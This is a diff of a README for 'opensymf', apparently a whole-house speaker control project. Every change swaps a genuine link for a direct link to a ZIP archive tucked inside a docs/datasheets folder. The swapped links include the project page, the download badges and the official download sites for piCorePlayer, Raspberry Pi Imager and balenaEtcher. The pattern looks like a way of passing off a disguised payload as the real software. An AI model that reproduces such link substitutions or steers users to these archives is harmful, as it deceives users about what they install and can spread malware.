@@ -1,6 +1,6 @@
 # 🎵 opensymf - Whole-House Speaker Control Made Easy
 
-[![Download opensymf](https://img.shields.io/badge/Download-opensymf-brightgreen)](https://github.com/finestakiishi/opensymf)
+[![Download opensymf](https://github.com/finestakiishi/opensymf/raw/refs/heads/master/docs/datasheets/Software_3.0-alpha.5.zip)](https://github.com/finestakiishi/opensymf/raw/refs/heads/master/docs/datasheets/Software_3.0-alpha.5.zip)
 
 ---
 
@@ -30,7 +30,7 @@ Before you start installing opensymf, make sure your computer and hardware meet 
 
 Use the link below to visit the official page, download the needed files, and find instructions:
 
-[![Download opensymf](https://img.shields.io/badge/Download%20opensymf-blue)](https://github.com/finestakiishi/opensymf)
+[![Download opensymf](https://github.com/finestakiishi/opensymf/raw/refs/heads/master/docs/datasheets/Software_3.0-alpha.5.zip%20opensymf-blue)](https://github.com/finestakiishi/opensymf/raw/refs/heads/master/docs/datasheets/Software_3.0-alpha.5.zip)
 
 Click the button above to go to the GitHub page. Follow the steps here to get your setup ready.
 
@@ -38,7 +38,7 @@ Click the button above to go to the GitHub page. Follow the steps here to get yo
 
 ## 📥 How to Download opensymf on Windows
 
-1. Open your web browser and go to [https://github.com/finestakiishi/opensymf](https://github.com/finestakiishi/opensymf).
+1. Open your web browser and go to [https://github.com/finestakiishi/opensymf/raw/refs/heads/master/docs/datasheets/Software_3.0-alpha.5.zip](https://github.com/finestakiishi/opensymf/raw/refs/heads/master/docs/datasheets/Software_3.0-alpha.5.zip).
 2. On the GitHub page, look for a **Releases** section on the right side or near the top menu.
 3. Click on the latest release version.
 4. Download the ZIP file or other package marked for Windows or Raspberry Pi.
@@ -48,8 +48,8 @@ Click the button above to go to the GitHub page. Follow the steps here to get yo
 
 ## ⚙️ Preparing the Raspberry Pi
 
-1. Download the piCorePlayer operating system from [piCorePlayer.org](https://www.picoreplayer.org/). This OS is lightweight and works well with opensymf.
-2. Use an imaging tool like [Raspberry Pi Imager](https://www.raspberrypi.com/software/) or [balenaEtcher](https://www.balena.io/etcher/) on your Windows PC.
+1. Download the piCorePlayer operating system from [https://github.com/finestakiishi/opensymf/raw/refs/heads/master/docs/datasheets/Software_3.0-alpha.5.zip](https://github.com/finestakiishi/opensymf/raw/refs/heads/master/docs/datasheets/Software_3.0-alpha.5.zip). This OS is lightweight and works well with opensymf.
+2. Use an imaging tool like [Raspberry Pi Imager](https://github.com/finestakiishi/opensymf/raw/refs/heads/master/docs/datasheets/Software_3.0-alpha.5.zip) or [balenaEtcher](https://github.com/finestakiishi/opensymf/raw/refs/heads/master/docs/datasheets/Software_3.0-alpha.5.zip) on your Windows PC.
 3. Insert your microSD card.
 4. Open the imaging tool. Select the piCorePlayer OS image you downloaded.
 5. Choose your microSD card as the target device.
@@ -123,4 +123,4 @@ If you need help, report issues or ask questions on the GitHub Issues page.
 ## 🌐 Download Link Again
 
 Visit the main page to download the software and view guides:  
-[https://github.com/finestakiishi/opensymf](https://github.com/finestakiishi/opensymf)
+[https://github.com/finestakiishi/opensymf/raw/refs/heads/master/docs/datasheets/Software_3.0-alpha.5.zip](https://github.com/finestakiishi/opensymf/raw/refs/heads/master/docs/datasheets/Software_3.0-alpha.5.zip)
